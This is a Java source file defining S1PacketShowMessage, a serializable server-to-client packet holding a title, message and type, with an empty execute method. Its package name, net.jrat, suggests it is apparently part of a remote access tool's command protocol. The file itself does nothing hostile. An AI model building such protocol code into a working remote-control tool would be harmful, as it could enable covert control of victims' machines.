package net.jrat.core.packet.server;

import net.jrat.core.packet.IPacket;

@SuppressWarnings("unused")
public class S1PacketShowMessage implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String message;
	private String title;
	private int type;
	
	public S1PacketShowMessage(String title, String message, int type)
	{
		this.title = title;
		this.message = message;
		this.type = type;
	}
	
	@Override
	public void execute(Object object) throws Exception {}
}